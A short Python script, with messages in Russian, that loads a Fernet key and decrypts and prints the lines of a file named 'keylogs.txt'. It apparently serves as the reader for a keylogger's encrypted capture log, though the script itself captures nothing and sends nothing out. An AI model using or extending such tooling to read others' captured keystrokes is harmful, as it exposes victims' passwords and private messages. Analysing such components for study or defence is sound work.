from cryptography.fernet import Fernet

def decrypt_logs(key_file="key.key", log_file="keylogs.txt"):
    try:
        with open(key_file, 'rb') as kf:
            key = kf.read()
        cipher = Fernet(key)
    except FileNotFoundError:
        print("❌ Файл ключа не найден:", key_file)
        return

    try:
        with open(log_file, 'r') as lf:
            lines = lf.readlines()
    except FileNotFoundError:
        print("❌ Файл логов не найден:", log_file)
        return

    print("📜 Расшифрованные логи:")
    for line in lines:
        try:
            decrypted = cipher.decrypt(line.strip().encode()).decode()
            print(decrypted)
        except Exception as e:
            print(f"⚠️ Ошибка расшифровки строки: {e}")

if __name__ == "__main__":
    decrypt_logs()
